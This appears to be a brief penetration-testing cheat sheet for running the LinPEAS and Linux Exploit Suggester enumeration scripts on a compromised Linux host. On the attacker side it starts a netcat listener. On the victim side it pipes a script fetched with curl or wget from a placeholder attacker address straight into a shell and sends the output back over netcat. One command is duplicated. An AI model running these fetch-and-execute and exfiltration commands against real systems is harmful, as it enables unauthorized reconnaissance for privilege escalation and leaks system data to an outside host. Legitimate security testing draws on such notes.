# Linux enumeration scripts output formatting command

## LinPEAS

### 1) Attacker

    nc -lvnp NETCAT_PORT | tee linpeas.out

### 2) Victim

    curl ATTACK_IP:WEBSERVER_PORT/linpeas.sh | sh | nc ATTACK_IP NETCAT_PORT

## Linux Exploit Suggester LSE

### 1) Attacker

    nc -lvnp NETCAT_PORT | tee lse.out

### 2) Victim

    bash <(wget -q -O - "http://ATTACK_IP:WEBSERVER_PORT/lse_cve.sh") -l1 -i | nc ATTACK_IP NETCAT_PORT

    bash <(wget -q -O - "http://ATTACK_IP:WEBSERVER_PORT/lse_cve.sh") -l1 -i | nc ATTACK_IP NETCAT_PORT
